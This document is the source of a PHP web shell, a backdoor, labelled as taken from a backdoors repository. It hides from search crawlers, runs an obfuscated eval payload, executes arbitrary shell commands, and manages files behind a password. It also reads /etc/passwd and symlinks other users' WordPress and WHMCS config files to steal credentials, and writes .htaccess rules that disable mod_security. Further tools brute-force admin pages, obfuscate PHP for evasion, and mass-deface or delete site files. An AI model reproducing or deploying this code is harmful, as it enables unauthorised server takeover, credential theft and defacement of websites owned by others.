<?php
// from https://github.com/1337r0j4n/php-backdoors
session_start();
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$password = "4982b37aa4ff1d1761d9567323d2cf38"; // default: hay
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", 
    	"Slurp", 
    	"MSNBot", 
    	"PycURL", 
    	"facebookexternalhit", 
    	"ia_archiver", 
    	"crawler", 
    	"Yandex", 
    	"Rambler", 
    	"Yahoo! Slurp", 
    	"YahooSeeker", 
    	"bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
};
eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B')))));
(isset($_GET['logout'])) {
	@logout();
}
function logout() {
	unset($_SESSION[@md5($_SERVER['HTTP_HOST'])]);
	@header("Location: http://".$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME']."");
}
function login_shell() {
?>
<link rel="icon" href="http://www.iconarchive.com/download/i91933/icons8/windows-8/User-Interface-Login.ico" sizes="32x32" >
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
<title>LOG IN</title>
<style type="text/css">
	img.logout {
		width:200px;
		height:200px;
	} input[type=password].logout {
		width:250px;
		text-align:center;
	} input[type=submit].logout {
		width:250px;
		text-align:center;
		margin:5px;
	} span.logout {
		color:#999999;
	}
</style>
            <center>
            <br>
            <br>
            <br>
            <br>
            <img src="https://www.shareicon.net/download/2016/10/20/846408_blue_512x512.png" class="logout">
            <br>
            <h2>PLEASE SIGN IN</h2>
            <form method="post">
            <input class="form-control logout" type="password" name="password" placeholder="PASSWORD">
            <input class="btn btn-success logout" type="submit" name="" value="LOGIN">
            </form>
            <span class="logout">&copy; <?php print @date("Y") ?> - L0LZ666H05T</span>
            </center>
            
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($password) || ( isset($_POST['password']) && (md5($_POST['password']) == $password) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
?>
<!DOCTYPE html>
<html>
<head>
<link rel="icon" href="http://cdn.onlinewebfonts.com/svg/img_77735.png" sizes="32x32" >
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
	<title>Filemanager</title>
</head>
<style type="text/css">
	@import url('https://fonts.googleapis.com/css?family=Orbitron|Roboto');
	body {
		font-family: 'Roboto', sans-serif;
	} @font-face {
        font-family: Hacked;
        src: url(https://hackedfont.com/HACKED.ttf);
    } div.manager {
		width:70%;
	} td.edit {
		border:none;
		background:none;
	} textarea.edit {
		height:400px;
		resize:none;
	} th {
		text-align:center;
	} .icon {
		width:25px;
		height:25px;
	} a:hover {
		text-decoration:none;
	} div.permission {
		float:right;
	}
</style>
<body>
<script type="text/javascript">
function select_all(pilih){
	var cek = document.getElementsByName('fl[]');
	for (var i =0; n=cek.length;i++) {
		cek[i].checked = pilih.checked;
	}
}
</script>
<br>
<?php
error_reporting(0);
define('SEP', '/');
define('CURR_PATH',(empty($_GET['u'])) ? @cwd() : $_GET['u']);
if (isset($_GET['dir'])) {
	@chdir($_GET['dir']);
}
function cwd() {
	$cwd = @str_replace('\\', '/', @getcwd());
	return $cwd;
}
function pwd() {
	$dir = @explode('/', @cwd());
	foreach ($dir as $key => $pwd) {
		print("<a href='?dir=");
		for ($i=0; $i <= $key ; $i++) { 
			print($dir[$i]);
			if ($i != $key) {
				print("/");
			}
		} print("'> ".$pwd."  </a> / ");
	}
}
function windisk() {
	$letters = "";
	$v = @explode("\\", @cwd());
	$v = $v[0];
	foreach(range("A", "Z") as $letter) {
		$bool = $isdiskette = in_array($letter, array("A"));
		if(!$bool) $bool = is_dir("$letter:\\");
		if($bool) {
			$letters .= "( <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
			if($letter.":" != $v) {
				$letters .= $letter;
			} else {
				$letters .= color(1, 2, $letter);
			} $letters .= "</a> )";
		}
	} if(!empty($letters)) {
		print "Detected Drives :  $letters <br>";
	} if(count($quicklaunch) > 0) {
		foreach($quicklaunch as $item) {
			$v = @realpath(@cwd(). "..");
			if(empty($v)) {
				$a = explode(DIRECTORY_SEPARATOR,path());
	  			unset($a[count($a)-2]);
	  			$v = join(DIRECTORY_SEPARATOR, $a);
			} print "<a href='".$item[1]."'>".$item[0]."</a>";
		} 
	}
}
function perms($filename) {
	$perms = fileperms($filename);
switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info = 's';
        break;
    case 0xA000: // symbolic link
        $info = 'l';
        break;
    case 0x8000: // regular
        $info = 'r';
        break;
    case 0x6000: // block special
        $info = 'b';
        break;
    case 0x4000: // directory
        $info = 'd';
        break;
    case 0x2000: // character special
        $info = 'c';
        break;
    case 0x1000: // FIFO pipe
        $info = 'p';
        break;
    default: // unknown
        $info = 'u';
}
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));
return $info;
}
function permission($filename, $perms) {
	if (@is_writable($filename)) {
		?> <font color="green"><?php print $perms ?></font> <?php
	} else {
		?> <font color="red"><?php print $perms ?></font> <?php
	}
}
function Cmd($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function redirect($kemana, $apa = 'html') {
	if($apa == 'html'){
		echo "<meta http-equiv='refresh' content='0;url={$kemana}'>";
	} elseif($apa == 'js') {
		echo "<script>window.location.href='{$kemana}';</script>";
	} elseif($apa == 'php') {
		@ob_start();
		header('location:'.$kemana);
		flush();
	}
}
function size($filename) {
	$size = @filesize($filename)/1024;
	$size = @round($size, 3);
	if ($size > 1024) {
		$size = @round($size/1024,2). 'MB';
	} else {
		$size = $size. 'KB';
	} return $size;
}
function edit($filename, $text) {
	$fp = @fopen($filename, 'w');
	if (@fwrite($fp, $text)) {
		?>
		<div class="alert alert-success" role="alert">
        This File <b><u><?php print $filename ?></u></b> Has Been Edited
        </div>
		<?php
	} else {
		?>
		<div class="alert alert-danger" role="alert">
         This File <b><u><?php print $filename ?></u></b> Failed To Edited
        </div>
		<?php
	}
}
function renames($filename, $newname) {
	if (@rename($filename, $newname)) {
		?>
		<div class="alert alert-success" role="alert">
			This File <b><u><?php print $filename ?></u></b> Has Been Rename to 
			<b><u><?php print $newname ?></u></b>
		</div>
		<?php
	} else {
		?>
		<div class="alert alert-danger" role="alert">
			This File <b><u><?php print $filename ?></u></b> Failed to Rename
		</div>
		<?php
	}
}
function chmods($filename, $mode) {
	if (@chmod($filename, $mode)) {
		?>
		<div class="alert alert-success" role="alert">
			This File <b><u><?php print $filename ?></u></b> Has Been Change to 
			<b><u><?php print $mode ?></u></b>
		</div>
		<?php
	} else {
		?>
		<div class="alert alert-danger" role="alert">
			This File <b><u><?php print $filename ?></u></b> Failed to Change
		</div>
		<?php
	}
}
function getMime($file) {
      if (function_exists('finfo_open')) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mimetype = finfo_file($finfo, $file);
        finfo_close($finfo);
      }
      else {
        $mimetype = mime_content_type($file);
      }
      if (empty($mimetype)) $mimetype = 'application/octet-stream';
      return $mimetype;
}
function createTools($filename, $location) {
	if ($_GET['create'] == $filename) {
		$directory = "".$filename.".php";
		if (file_exists($directory)) {
			?> <script>window.location='<?php print $directory ?>';</script> <?php
		} else {
			@mkdir(".tools", 0777);
			@file_put_contents($directory, @file_get_contents($location));
			?> <script>window.location='<?php print $directory ?>';</script> <?php
		}
	}
}
function makedir($filename) {
	if (@mkdir(@htmlspecialchars($filename))) {
		?>
		<div class="alert alert-success" role="alert">
			This Dir <b><u><?php print $filename ?></u></b> Has Been Created !
		</div>
		<?php
	} else {
		?>
		<div class="alert alert-danger" role="alert">
			This Dir <b><u><?php print $filename ?></u></b> Failed to Create
		</div>
		<?php
	}
}
function makefile($filename, $text) {
	$fp = @fopen($filename, "w");
	if (@fwrite($fp, $text)) {
		?>
		<div class="alert alert-success" role="alert">
			This File <b><u><?php print $filename ?></u></b> Has Been Created !
		</div>
		<?php
	} else {
		?>
		<div class="alert alert-danger" role="alert">
			This File <b><u><?php print $filename ?></u></b> Failed to Create
		</div>
		<?php
	}
	@flush();
}
if(isset($_POST['sac'])){
	if($_POST['action'] == 'delete'){
		@delete($_POST['file']);
	}
	@redirect('?dir='.@cwd().'');
}
?>
<center>
	<div class="form-control manager" disable>
		<center><b><h2>FILEMANAGER</h2></b></center>
		<table width="100%" align="center" class="table table-bordered">
			<tr>
    		<th colspan="4">
    			<center>
    				Cwd : <?php print @pwd() ?> ( <?php print @permission(@cwd(), @perms(@cwd())) ?> )
    			</center>
    		</th>
    		<th rowspan="2">
    			<div class="btn-group" style="margin-top:22px;">
                  <a href="http://<?php print $_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'] ?>" style="font-weight:bold;color:#fff;" class="btn btn-success btn-sm" style="width:100%;">
                    HOME
                  </a>
                  <button type="button" class="btn btn-sm btn-success dropdown-toggle dropdown-toggle-split" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                   <span class="sr-only">Toggle Dropdown</span>
                  </button>
                  <div class="dropdown-menu">
                   <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=upload">
                   	<img src="https://www.pngarts.com/files/2/Upload-PNG-Image-Background.png" class="icon">
                    Upload File</a>
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=cmd">
                    <img src="https://img.icons8.com/metro/420/command-line.png" class="icon">
                    Command
                    </a>
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=makefile">
                    <img src="http://www.sclance.com/pngs/add-png/add_png_16398.jpg" class="icon">
                    Add File</a> 
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=config">
                    <img src="https://secure.webtoolhub.com/static/resources/icons/set110/3d5197b6.png" class="icon">
                     Config</a>
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=csrf"> 
                    <img src="https://img.icons8.com/metro/420/link.png" class="icon">
                     CSRF</a>
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=adfin"> 
                    <img src="http://icons.iconarchive.com/icons/icons8/windows-8/256/Users-Find-User-icon.png" class="icon">
                    Admin Finder</a>
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=encode"> 
                    <img src="https://image.flaticon.com/icons/png/512/59/59118.png" class="icon">
                    Encode & Decode</a>
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=mass"> 
                    <img src="https://www.freeiconspng.com/uploads/blank-duplicate-files-icon-png-0.png" class="icon">
                    Mass Deface & Mass Delete</a>
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=editUser">
                    <img src="https://image.flaticon.com/icons/png/512/97/97843.png" class="icon">
                    Auto Edit User</a>
                    <a class="dropdown-item" href="?logout">
                    <img src="https://png.pngtree.com/svg/20170825/de691f7b9e.png" class="icon">
                    Logout</a>
                  </div>
                </div>
    		</th>
    	    </tr>
    	    <tr>
    	    	<th colspan="4">
    	    		<?php print @windisk() ?>
    	    	</th>
    	    </tr>
		<tr>
		<?php
	function delete($dir) {
	if (@is_dir($dir)) {
		$scandir = @scandir($dir);
		foreach ($scandir as $object) {
			if ($object != '.' && $object != '..') {
				if (@is_dir($dir.DIRECTORY_SEPARATOR.$object)) {
					@delete($dir.DIRECTORY_SEPARATOR.$object);
				} else {
					@unlink($dir.DIRECTORY_SEPARATOR.$object);
				}
			}
		} if (@rmdir($dir)) {
			?>
			<center>
		    <div class="alert alert-success" role="alert">
            This Dir <b><u><?php print $dir ?></u></b> Has Been Deleted
            </div>
            </center>
		    <?php
		} else {
			?>
			<center>
		    <div class="alert alert-danger" role="alert">
            This Dir <b><u><?php print $dir ?></u></b> Failed to Delete
            </div>
            </center>
		    <?php
		}
	} else {
		if (@unlink($dir)) {
			?>
			<center>
		    <div class="alert alert-success" role="alert">
            This File <b><u><?php print $dir ?></u></b> Has Been Deleted
            </div>
            </center>
		    <?php
		} else {
			?>
			<center>
		    <div class="alert alert-danger" role="alert">
            This File <b><u><?php print $dir ?></u></b> Failed to Delete
            </div>
            </center>
		    <?php
		}
	}
}
if ($_POST['do'] == 'delete') {
	@delete($_POST['file']);
    }
if ($_GET['do'] == 'config') {
	?>
	<tr>
			<th colspan="5">
				<h2>GET CONFIG</h2>
			</th>
		</tr>
	<?php
	if (isset($_POST['submit'])) {
		@mkdir(".config", 0777);
		$htaccess = " # Config Symlink By L0LZ666H05T \nOptions Indexes FollowSymLinks \nForceType text/plain \nAddType text/plain .php \nAddType text/plain .html \nAddType text/html .shtml \nAddType txt .php \nAddHandler server-parsed .php \nAddHandler server-parsed .shtml \nAddHandler txt .php \nAddHandler txt .html \nAddHandler txt .shtml \nOptions All \n<IfModule mod_security.c> \nSecFilterEngine Off \nSecFilterScanPOST Off \nSecFilterCheckURLEncoding Off \nSecFilterCheckCookieFormat Off \nSecFilterCheckUnicodeEncoding Off \nSecFilterNormalizeCookies Off \n</IfModule>";
		$fp = fopen('.config/.htaccess','w');
		@fwrite($fp,$htaccess);
		?> 
		<tr>
			<td colspan="5">
				<a style="width:100%;" class="btn btn-success" href=".config" target="_blank">Click Here</a>
			</td>
		</tr>
		<?php
		$usr = @explode("\n",$_POST['user']);
		foreach($usr as $uss) {
			$us = @trim($uss);
			$l = ".config/";
			symlink('/home/'.$us.'/public_html/wp-config.php',$l.$us.'.wp-config');
			symlink('/home/'.$us.'/public_html/configuration.php',$l.$us.'.joomla-or-whmcs');
			symlink('/home/'.$us.'/public_html/blog/wp-config.php',$l.$us.'.wp-config');
			symlink('/home/'.$us.'/public_html/blog/configuration.php',$l.$us.'.joomla');
			symlink('/home/'.$us.'/public_html/wp/wp-config.php',$l.$us.'.wp-config');
            symlink('/home/'.$us.'/public_html/wordpress/wp-congig.php',$l.$us.'.wordpress');
            symlink('/home/'.$us.'/public_html/config.php',$l.$us.'..config');
            symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'.whmcs');
            symlink('/home/'.$us.'/public_html/support/configuration.php',$l.$us.'.supporwhmcs');
            symlink('/home/'.$us.'/public_html/secure/configuration.php',$l.$us.'.securewhmcs');
            symlink('/home/'.$us.'/public_html/clients/configuration.php',$l.$us.'.whmcs-clients');
            symlink('/home/'.$us.'/public_html/client/configuration.php',$l.$us.'.whmcs-client');
            symlink('/home/'.$us.'/public_html/billing/configuration.php',$l.$us.'.whmcs-billing');
            symlink('/home/'.$us.'/public_html/admin/config.php',$l.$us.'.admin-config');
		}
	}
	?>
	    <form method="post">
	    <tr>
	    	<td colspan="5">
	    		<textarea name="user" class="form-control edit"><?php
			       $users = @file("/etc/passwd");
			       foreach($users as $user) {
				       $str = @explode(":",$user);
                       print($str[0]."\n");
			       }
			           ?>
		           </textarea>
	    	</td>
	    </tr>
		<tr>
			<td colspan="5">
				<input class="btn btn-success" type="submit" name="submit" style="width:100%;">
			</td>
		</tr>
	    </form>
		<?php
		die();
}
	if ($_GET['do'] == 'csrf') {
		?>
		<tr>
			<th colspan="5">
				<h2>CSRF Online</h2>
			</th>
		</tr>
		<form method="post">
		<tr>
			<td colspan="5">
				<input class="form-control" type="text" name="url" placeholder="URL : http://www.target.com/[path]/upload.php">
			</td>
		</tr>
		<tr>
			<td colspan="5">
				<input class="form-control" type="text" name="file" placeholder="POST File : Filedata / files[] / qqfile / userfile / dll">
			</td>
		</tr>
		<tr>
			<td colspan="5">
				<input class="btn btn-success" type="submit" name="lock" value="LOCK" style="width:100%;">
			</td>
		</tr>
	    </form>
		<?php
		$url = $_POST['url'];
		$file = $_POST['file'];
		$lock = $_POST['lock'];
		if ($lock) {
			?>
			<form method="post" enctype="multipart/form-data" action="<?php print $url ?>">
				<tr>
					<td colspan="4">
						<input type="file" name="<?php print $file ?>">
					</td>
					<td>
						<input class="btn btn-success btn-sm" type="submit" name="" style="width:100%;">
					</td>
				</tr>
			</form>
			<?php
			exit();
		}
	}
    if($_GET['do'] == 'adfin') {
    ?>
    <tr>
    	<th colspan="5">
    		<h2>ADMIN PAGE FINDER</h2>
    	</th>
    </tr>
    <form method="post" action="<?php $PHP_SELF ?>">
    <tr>
        <td colspan="5">
            <input class="form-control" type="text" name="url" placeholder="http://www.site.com">
        </td>
    </tr>
    <tr>
        <td colspan="5"> 
            <input style="width:100%" class="btn btn-success" type="submit" name="submit" value="FIND">
        </td>
    </tr>
</form>
<?php
    if($strip_tags) {function xss_protect($data, $strip_tags = false, $allowed_tags = "") { 

  $data = strip_tags($data, $allowed_tags . "<b>");
    }

    if(stripos($data, "script") !== false) { 
  $result = str_replace("script","scr<b></b>ipt", htmlentities($data, ENT_QUOTES)); 
    } else { 
  $result = htmlentities($data, ENT_QUOTES); 
    } 

    return $result;
}
function urlExist($url){
    $handle   = curl_init($url);
    if (false === $handle)
    {
    return false;
    }
    curl_setopt($handle, CURLOPT_HEADER, false);
    curl_setopt($handle, CURLOPT_FAILONERROR, true);
    curl_setopt($handle, CURLOPT_HTTPHEADER, Array("User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15") ); // request as if Firefox
    curl_setopt($handle, CURLOPT_NOBODY, true);
    curl_setopt($handle, CURLOPT_RETURNTRANSFER, false);
    $connectable = curl_exec($handle);
    curl_close($handle);
    return $connectable;
}
    if(isset($_POST['submit']) && isset($_POST['url']))
    {
  $url= htmlentities(xss_protect($_POST['url']));
  if(filter_var($url, FILTER_VALIDATE_URL))
  {
$trying = array('admin/',
        'administrator/index.php',
        'admin1/index.php',
        'admin2/index.php',
        'kpu-kun194n/login.php',
        'kpu-kun194n/index.php',
        'kpu-Kun194n/login.php',
        'Kpu-kun194n/login.php',
        'b4w45lu-kun1n94n/login.php',
        'b4w45lu-kun1n94n/index.php',
        'bawaslu-kun1n94n/login.php',
        '4dm1n-b4w45lu/index.php',
        'admin_bawaslu/index.php',
        'admin_bawaslu/login.php',
        'admin_panel/index.php',
        'bawaslu-kun1n94n/login.php',
        'adminweb/login.php',
        'admin3/index.php/',
        'admin4/index.php',
        'admin5/index.php',
        'usuarios/index.php',
        'usuario/index.php',
        'administrator/index.php',
        'moderator/index.php',
        'webadmin/index.php',
        'adminarea/index.php',
        'cms/index.php',
        'adminarea/index.php',
        'kantor/admin_login.php',
        'kantor/admin_login.php',
        'adminweb/login.php',
        'bb-admin/index.php',
        'zoom-admin/index.php',
        'admin-portal/index.php',
        'CmsPanel/index.php',
        'cmspanel/index.php',
        'indexadmin/index.php',
        'administratorbawaslu/index.php',
        'adminLogin/index.php',
        'admin_area/',
        'panel-administracion/',
        'instadmin/',
        'memberadmin/',
        'administratorlogin/',
        'adm/',
        'admin/account.php',
        'admin/index.php',
        'admin/login.php',
        'admin/admin.php',
        'admin/account.php',
        'admin_area/admin.php',
        'admin_area/login.php',
        'siteadmin/login.php',
        'siteadmin/index.php',
        'siteadmin/login.html',
        'admin/account.html',
        'admin/index.html',
        'admin/login.html',
        'admin/admin.html',
        'admin_area/index.php',
        'bb-admin/index.php',
        'bb-admin/login.php',
        'bb-admin/admin.php',
        'admin/home.php',
        'admin_area/login.html',
        'admin_area/index.html',
        'admin/controlpanel.php',
        'admin.php',
        'admincp/index.asp',
        'admincp/login.asp'
       ,'admincp/index.html'
       ,'admin/account.html'
       ,'adminpanel.html','webadmin.html',
       'webadmin/index.html');
    foreach($trying as $sec) {
    $urll = $url.'/'.$sec;
    if(urlExist($urll)) {
        ?>
        <tr>
           <td>
               <a href="<?php print $urll ?>" target="_blank"><?php print $urll ?></a>
           </td>
           <td>
               <center><span class="found">FOUND</span></center>
           </td> 
        </tr>
        <?php
    exit;
    }
    else {
    ?>
    <tr>
        <td>
            <?php print $urll ?>
        </td>
        <td>
            <center>
                <center><span class="not_found">NOT FOUND</span></center>
            </center>
        </td>
    </tr>
    <?php
    }   
    }
    echo '<p align="center"><font color="c0c0c0" size="5">Could not find admin page.</font></p>';
  }
  else
  {
    echo '<p align="center"><font color="c0c0c0" size="5">Invalid URL entered.</font></p>';    
  }
    }
?>
<?php
die();
}
if ($_GET['do'] == 'encode') {
    ?>
    <tr>
    	<th colspan="5">
    		<h2>ENCODE & DECODE</h2>
    	</th>
    </tr>
       <form method="post">
        <tr>
            <td colspan="5">
                <textarea class="form-control edit" name="code"></textarea>
            </td>
        </tr>
        <tr>
            <td colspan="3">
        <select class="form-control" name="ope">
        <option value="urlencode">url</option>
        <option value="base64">Base64</option>
        <option value="ur">base64 - convert_uu</option>
        <option value="gzinflates">gzinflate - base64</option>
        <option value="str2">str_rot13 - base64</option>
        <option value="gzinflate">str_rot13 - gzinflate - base64</option>
        <option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
        <option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
        </select>
            </td>
            <td>
                <input style="width:100%;" class="btn btn-success" type='submit' name='submit' value='Encode'>
            </td>
            <td>
                <input style="width:100%;" class="btn btn-success" type='submit' name='submits' value='Decode'>
            </td>
        </tr>
</form>
<?php 
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
$text = $_POST['code'];
$submit = $_POST['submit'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {
case 'base64': $codi=base64_encode($text);
$codi="<?php eval('?>'.base64_decode('$codi'));";
break;
case 'str' : $codi=base64_encode(str_rot13(gzdeflate(str_rot13($text))));
$codi="<?php
eval('?>'.str_rot13(gzinflate(str_rot13(base64_decode('$codi')))));";
break;
case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
$codi="<?php
eval('?>'.str_rot13(gzinflate(base64_decode('$codi'))));";
break;
case 'gzinflates' : $codi=base64_encode(gzdeflate($text));
$codi="<?php
eval('?>'.gzinflate(base64_decode('$codi')));";
break;
case 'str2' : $codi=base64_encode(str_rot13($text));
$codi="<?php
eval('?>'.str_rot13(base64_decode('$codi')));";
break;
case 'urlencode' : $codi=rawurlencode($text);
$codi="<?php eval('?>'.rawurldecode('$codi'));";
break;
case 'ur' : $codi=base64_encode(convert_uuencode($text));
$codi="<?php
eval('?>'.convert_uudecode(base64_decode('$codi')));";
break;
case 'url' :
$codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
$codi="<?php
eval('?>'.base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode('$codi')))))));";
break;
default:break;
}
}
$submit = $_POST['submits'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_decode($text);
break;case 'str' :
$codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
break;case 'gzinflates' : $codi=gzinflate(base64_decode($text));
break;case 'str2' : $codi=str_rot13(base64_decode($text));
break;case 'urlencode' : $codi=rawurldecode($text);
break;case 'ur' : $codi=base64_encode(convert_uudecode($text));
break;case 'url' :
$codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
break;default:break;}}
?>
<tr>
    <td colspan="5">
        <textarea class="form-control edit" readonly><?php print $codi ?></textarea>
    </td>
</tr>
<?php
die();
}
if ($_GET['do'] == 'mass') {
function massdeface($cwd, $file, $filename, $type = null) {
	$scandir = scandir($cwd);
	foreach($scandir as $dir) {
		$path     = $cwd.SEP.$dir;
		$location = $path.SEP.$filename;
		if($dir === "." || $dir === "..") {
			@file_put_contents($location, $file);
		} else {
		if(is_dir($path) AND is_writable($path)) {
			?>
			<tr>
				<td colspan="5">
					<div class="alert alert-success" role="alert">
			        <b>[ DONE ]</b> => <u><?php print $location ?></u> ! 
		            </div>
				</td>
			</tr>
			<?php
			file_put_contents($location, $file);
			if($type === "-alldir") {
				massdeface($path, $file, $filename, "-alldir");
			}
			}
		}
	}
}
function massdelete($cwd, $filename) {
	$scandir = scandir($cwd);
	foreach($scandir as $dir) {
		$path     = $cwd.SEP.$dir;
		$location = $path.SEP.$filename;
		if($dir_ === '.') {
			if(file_exists($dir.SEP.$filename)) {
				@unlink($dir.SEP.$filename);
			}
		} elseif($dir_ === '..') {
			if(file_exists(dirname($dir).SEP.$filename)) {
				@unlink(dirname($dir).SEP.$filename);
			}
		} else {
			if(is_dir($path) AND is_writable($path)) {
				if(file_exists($location)) {
					?>
			        <tr>
			        	<td colspan="5">
			        		<div class="alert alert-success" role="alert">
			                <b>[ DELETED ]</b> => <u><?php print $location ?></u> ! 
		                    </div>
			        	</td>
			        </tr>
			        <?php
					@unlink($location);
                    @massdelete($path, $filename);
				}
			}
		}
	}
}
if (isset($_POST['submit'])) {
	if ($_POST['mass_type'] == 'single') {
		@massdeface($_POST['cwd'], $_POST['text'], $_POST['filename']);
	} elseif ($_POST['mass_type'] == 'alldir') {
		@massdeface($_POST['cwd'], $_POST['text'], $_POST['filename'], "-alldir");
	} elseif ($_POST['mass_type'] == 'massdelete') {
		@massdelete($_POST['cwd'], $_POST['filename']);
	}
}
?>
<tr>
	<th colspan="5">
		<h2>MASS TOOLS</h2>
	</th>
</tr>
<form method="post">
	<tr>
		<td colspan="5">
			<select class="form-control" name="mass_type">
		       <option value="single">Single Dir</option>
		       <option value="alldir">All Dir</option>
		       <option value="massdelete">Delete Dir</option>
	        </select>
		</td>
	</tr>
	<tr>
		<td colspan="5">
			<input class="form-control" type="text" name="cwd" value="<?php print @cwd() ?>">
		</td>
	</tr>
	<tr>
		<td colspan="5">
			<input class="form-control" type="text" name="filename" value="index.php">
		</td>
	</tr>
	<tr>
		<td colspan="5">
			<textarea class="form-control edit" name="text">HACKED BY L0LZ666H05T</textarea>
		</td>
	</tr>
	<tr>
		<td colspan="5">
			<input class="btn btn-success" type="submit" name="submit" style="width:100%;">
		</td>
	</tr>
